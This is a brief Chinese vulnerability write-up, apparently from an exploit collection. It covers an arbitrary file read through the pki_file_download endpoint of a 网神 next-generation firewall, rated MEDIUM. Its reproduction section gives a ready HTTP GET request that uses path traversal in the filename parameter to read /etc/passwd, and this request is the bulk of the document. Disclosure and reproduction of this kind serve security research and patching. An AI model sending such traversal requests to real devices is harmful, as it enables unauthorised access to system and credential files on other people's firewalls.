# 网神 下一代极速防火墙 pki_file_download 任意文件读取漏洞

## 漏洞描述
网神下一代极速防火墙 pki_file_download 存在任意文件读取漏洞，攻击者可以通过漏洞获取服务器上的任意文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202162229226.png)

发送请求包

```plain
GET /?g=pki_file_download&filename=../../../../../etc/passwd HTTP/1.1
Host: 
Connection: close
